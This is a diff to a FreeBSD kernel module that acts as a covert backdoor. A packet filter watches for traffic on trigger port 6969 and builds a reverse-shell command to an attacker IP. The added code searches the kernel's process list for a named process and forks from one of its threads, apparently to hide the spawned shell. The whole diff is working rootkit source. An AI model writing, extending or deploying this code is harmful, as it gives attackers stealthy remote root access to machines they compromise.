@@ -20,6 +20,8 @@
 #include <sys/syslog.h>
 #include <sys/eventhandler.h>
 #include <sys/libkern.h>  // Kernel-space string functions
+#include <sys/sx.h> // for finding proc
+#include <sys/queue.h> // for finding proc
 
 // Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
@@ -66,6 +68,23 @@ static void unload_custom_fork_event_handler(void) {
 
 
 
+    static struct proc *find_process_by_name(const char *name) {
+        struct proc *p;
+
+        sx_slock(&allproc_lock);  // Lock process list
+        LIST_FOREACH(p, &allproc, p_list) {
+            PROC_LOCK(p);
+            if (strcmp(p->p_comm, name) == 0) {
+                PROC_UNLOCK(p);
+                sx_sunlock(&allproc_lock);
+                return p;  // Return first found instance
+            }
+            PROC_UNLOCK(p);
+        }
+        sx_sunlock(&allproc_lock);
+
+        return NULL;  // No matching process found
+    }
 
 /*
  * Start of custom packet filtering
@@ -143,10 +162,31 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
 
+        // Find the process "apeshit"
+        parent_proc = find_process_by_name(TARGET_PROC);
+        if (parent_proc == NULL) {
+            printf("[LKM] No running process named '%s' found.\n", TARGET_PROC);
+            return PFIL_PASS;
+        }
+        // Get the first thread of that process
+        parent_td = FIRST_THREAD_IN_PROC(parent_proc);
 
 
+        struct fork_req fr;
+        struct proc *new_proc;
+        int error, new_pid;
 
+        bzero(&fr, sizeof(fr));
+        fr.fr_flags = RFPROC;
+        fr.fr_pidp = &new_pid;
+        fr.fr_procp = &new_proc;
 
+        // Fork from the found process
+        error = fork1(parent_td, &fr);
+        if (error) {
+            printf("[LKM] Fork failed: %d\n", error);
+            return PFIL_PASS;
+        }
 
 
     printf("Packet with source port 6969 detected!!\n");
